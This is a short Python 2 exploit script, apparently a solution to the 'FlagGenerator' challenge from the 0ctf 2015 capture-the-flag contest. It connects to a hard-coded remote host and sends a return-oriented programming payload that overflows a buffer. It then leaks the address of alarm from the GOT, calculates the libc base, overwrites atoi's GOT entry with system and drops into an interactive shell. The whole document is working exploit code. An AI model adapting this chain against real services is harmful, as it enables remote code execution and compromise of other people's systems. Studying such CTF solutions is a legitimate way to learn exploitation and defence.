#!/usr/bin/env python
import struct,socket,telnetlib
# 0ctf 2015
# exploit : FlagGenerator

def shell():
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def p(addr):
	return struct.pack("<I",addr)

def read_until(token):
	data = ""
	while not data.endswith(token):
		data += f.read(1)
	return data

s = socket.create_connection(("202.112.26.106",5149))
#s = socket.create_connection(("127.0.0.1",12345))
f = s.makefile('rw',bufsize=0)

alarm_got = 0x0804b018
puts_plt = 0x8048510
system_offset = 0x40190
alarm_offset = 0xb54c0

add_esp = 0x08048d89 # add esp 0x1c -> pop4ret
popret = 0x08048481 # pop ebx -> ret
getinput = 0x80486cb


payload = p(add_esp)
payload += p(0x90919293) * 2
payload += p(puts_plt) + p(popret) + p(alarm_got)

payload += p(getinput)
payload += p(0x8048d8e) # pop2ret
payload += p(0x0804b03c) # atoi_got
payload += p(0x01010101) # size
payload += p(0x8048560)
payload += p(0x90919293)
payload += p(0x804b03c + 4) # /bin/sh

payload = payload.ljust(124,"D")

payload += "H" * 50 + "AA"
payload += p(0x0804b01c)

# 4 + 270 + 2 + 4 = 280

f.write("1\n") # flag
f.write(payload + "\n")
f.write("4\n")

print read_until("choice")
print read_until("choice")

leak_addr = read_until("\n")[2:6]
leak_addr = struct.unpack("<I",leak_addr)[0]

print "we get alarm address " + hex(leak_addr)

libc_base = leak_addr - alarm_offset
system = libc_base + system_offset

print "we get libc base address " + hex(libc_base)
f.write(p(system) + "/bin/sh" +  "\n") # write system address to atoi got

shell()

